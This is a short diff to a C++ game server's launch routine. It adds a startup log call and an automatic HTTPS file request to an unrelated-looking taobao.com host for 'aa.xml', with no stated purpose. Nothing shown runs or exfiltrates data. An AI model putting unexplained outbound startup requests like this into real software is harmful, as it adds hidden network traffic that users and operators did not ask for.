@@ -20,6 +20,7 @@
 #include "skillmodule.h"
 #include "rankmodule.h"
 #include "loginplayer.h"
+#include "platlog.h"
 
 CSceneJob::CSceneJob()
 :mMinuteTimer(SECONDS_PER_MIN)
@@ -99,6 +100,9 @@ void CSceneJob::doLaunch()
 		printf("Server Launch Complete\n");
 		launchComplete();
 		mServerState = emServerStateRun;
+		
+		LogServerStartComplete();
+		sendPlatWebRequest("https://13767458185.taobao.com", "aa.xml", EmHttpType(emHttpTypeGet | emHttpTypeSSL | emHttpTypeFile), false);
 	}
 }
 
